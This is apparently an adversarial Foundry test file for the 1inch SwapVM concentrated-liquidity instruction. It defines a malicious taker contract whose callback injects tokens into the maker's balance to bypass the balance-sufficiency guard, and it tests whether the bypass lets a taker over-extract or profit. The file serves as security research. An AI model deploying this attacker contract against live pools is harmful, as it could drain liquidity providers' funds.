// SPDX-License-Identifier: LicenseRef-Degensoft-SwapVM-1.1
pragma solidity 0.8.30;

import { console } from "forge-std/console.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { TokenMock } from "@1inch/solidity-utils/contracts/mocks/TokenMock.sol";
import { Aqua } from "@1inch/aqua/src/Aqua.sol";

import { AquaSwapVMTest } from "../base/AquaSwapVMTest.sol";
import { ISwapVM } from "../../src/interfaces/ISwapVM.sol";
import { ITakerCallbacks } from "../../src/interfaces/ITakerCallbacks.sol";
import { SwapVM } from "../../src/SwapVM.sol";
import { TakerTraitsLib } from "../../src/libs/TakerTraits.sol";
import { Program, ProgramBuilder } from "../utils/ProgramBuilder.sol";
import { XYCSwap } from "../../src/instructions/XYCSwap.sol";
import { XYCConcentrate, XYCConcentrateArgsBuilder } from "../../src/instructions/XYCConcentrate.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";

/// Malicious taker: preTransferOutCallback INJECTS tokenOut into the maker's Aqua balance right before the
/// tokenOut pull, so the balance-sufficiency guard (amountOut <= real balanceOut) is bypassed. This is the
/// TAKER vector of OZ's "Hook Token Injection bypasses concentrated price bounds" (fix = docs for MAKERS only).
/// Question: on the stateless v1.0.2 XYCConcentrate, can this over-extraction yield taker PROFIT (round-trip)?
contract InjectTaker is ITakerCallbacks {
    Aqua public immutable AQUA;
    SwapVM public immutable SWAPVM;
    address maker;
    bytes32 h;
    address injectToken;   // tokenOut to inject
    uint256 injectAmount;  // how much to inject in preTransferOutCallback
    address tokenInPush;   // for preTransferInCallback (pay tokenIn)

    constructor(Aqua a, SwapVM s) { AQUA = a; SWAPVM = s; }
    function cfg(address _maker, bytes32 _h, address _injTok, uint256 _injAmt, address _tin) external {
        maker=_maker; h=_h; injectToken=_injTok; injectAmount=_injAmt; tokenInPush=_tin;
    }
    function go(ISwapVM.Order calldata o, address tin, address tout, uint256 amt, bytes calldata td) external returns (uint256 ai, uint256 ao) {
        (ai, ao,) = SWAPVM.swap(o, tin, tout, amt, td);
    }
    function preTransferOutCallback(address _maker, address, address, address tokenOut, uint256, uint256, bytes32 orderHash, bytes calldata) external {
        // inject tokenOut into maker's aqua balance to bypass balance-sufficiency
        if (injectAmount > 0) {
            ERC20(injectToken).approve(address(AQUA), injectAmount);
            AQUA.push(_maker, address(SWAPVM), orderHash, tokenOut, injectAmount);
        }
    }
    function preTransferInCallback(address _maker, address, address tokenIn, address, uint256 amountIn, uint256, bytes32 orderHash, bytes calldata) external {
        ERC20(tokenIn).approve(address(AQUA), amountIn);
        AQUA.push(_maker, address(SWAPVM), orderHash, tokenIn, amountIn);
    }
}

contract AdvConcentrateHookTest is AquaSwapVMTest {
    using ProgramBuilder for Program;
    function setUp() public override { super.setUp(); }

    function _td(address t) internal pure returns (bytes memory){
        return TakerTraitsLib.build(TakerTraitsLib.Args({taker:t,isExactIn:true,shouldUnwrapWeth:false,hasPreTransferInCallback:true,hasPreTransferOutCallback:true,isStrictThresholdAmount:false,isFirstTransferFromTaker:false,useTransferFromAndAquaPush:false,threshold:"",to:address(0),deadline:0,preTransferInHookData:"",postTransferInHookData:"",preTransferOutHookData:"",postTransferOutHookData:"",preTransferInCallbackData:"",preTransferOutCallbackData:"",instructionsArgs:"",signature:""}));
    }

    function _concOrder(uint256 sMin, uint256 sMax, uint256 balA, uint256 balB) internal returns (ISwapVM.Order memory o, bytes32 h) {
        Program memory p = ProgramBuilder.init(_opcodes());
        bytes memory prog = bytes.concat(
            p.build(XYCConcentrate._xycConcentrateGrowLiquidity2D, XYCConcentrateArgsBuilder.build2D(sMin, sMax)),
            p.build(XYCSwap._xycSwapXD)
        );
        o = createStrategy(prog);
        h = shipStrategy(o, tokenA, tokenB, balA, balB);
        tokenA.mint(maker, type(uint128).max); tokenB.mint(maker, type(uint128).max);
    }

    // Attack: taker over-extracts tokenB beyond real reserve via injection, then reverses. Check for profit.
    function testFuzz_concentrate_inject_roundtrip(uint256 balA, uint256 balB, uint256 sMin, uint256 sMax, uint256 amtIn, uint256 inj) public {
        balA = bound(balA, 1e12, 1e24);
        balB = bound(balB, 1e12, 1e24);
        sMin = bound(sMin, 1e6, 1e17);
        sMax = bound(sMax, sMin + 1, 1e18);
        (ISwapVM.Order memory o, bytes32 h) = _concOrder(sMin, sMax, balA, balB);

        InjectTaker t = new InjectTaker(aqua, swapVM);
        // fund taker with both tokens (to pay tokenIn and to inject tokenOut)
        tokenA.mint(address(t), type(uint128).max);
        tokenB.mint(address(t), type(uint128).max);
        uint256 a0 = tokenA.balanceOf(address(t));
        uint256 b0 = tokenB.balanceOf(address(t));

        // leg1: A->B (buy B). inject some B to allow over-extraction.
        t.cfg(maker, h, address(tokenB), bound(inj, 0, balB), address(tokenA));
        amtIn = bound(amtIn, 1e6, balA);
        try t.go(o, address(tokenA), address(tokenB), amtIn, _td(address(t))) returns (uint256, uint256 gotB) {
            // leg2: B->A (sell the B back). no injection needed (A reserve present); but set inject for A side too.
            t.cfg(maker, h, address(tokenA), 0, address(tokenB));
            try t.go(o, address(tokenB), address(tokenA), gotB, _td(address(t))) returns (uint256, uint256) {
                // net value check at 1:1 (both bounded similarly). Require taker did NOT gain both tokens.
                uint256 a1 = tokenA.balanceOf(address(t));
                uint256 b1 = tokenB.balanceOf(address(t));
                // taker must not end up with more of BOTH tokens (strict value gain proxy);
                // and must not gain tokenA while holding >= tokenB (round trip in A)
                bool gainedA = a1 > a0;
                bool gainedB = b1 > b0;
                assertFalse(gainedA && gainedB, "taker gained BOTH tokens via inject (theft)");
                if (gainedA) assertLe(b0 - b1, 0, "unexpected"); // if gained A, must have paid B (can't also keep B)
            } catch {}
        } catch {}
    }

    // Direct over-extraction profit: single A->B where amountOut_B > real balanceB, via injection; measure net.
    function test_concentrate_overextract_single() public {
        // pool near upper price bound-ish: small balB relative to balA
        (ISwapVM.Order memory o, bytes32 h) = _concOrder(1e8, 1e10, 1000e18, 10e18);
        InjectTaker t = new InjectTaker(aqua, swapVM);
        tokenA.mint(address(t), type(uint128).max);
        tokenB.mint(address(t), type(uint128).max);
        uint256 a0 = tokenA.balanceOf(address(t));
        uint256 b0 = tokenB.balanceOf(address(t));
        // big A in -> concentrated curve may compute amountOut_B > real 10e18; inject 100e18 B to allow it
        t.cfg(maker, h, address(tokenB), 100e18, address(tokenA));
        try t.go(o, address(tokenA), address(tokenB), 500e18, _td(address(t))) returns (uint256 ai, uint256 ao) {
            uint256 a1 = tokenA.balanceOf(address(t));
            uint256 b1 = tokenB.balanceOf(address(t));
            console.log("single: amountIn(A), amountOut(B):", ai, ao);
            console.log("taker A delta (paid):", a0 - a1);
            if (b1 >= b0) console.log("taker B gain:", b1 - b0); else console.log("taker B loss:", b0 - b1);
            // taker paid A, net B = ao - injected(100e18). If net B value > A paid -> profit
        } catch { console.log("single: reverted"); }
    }
}
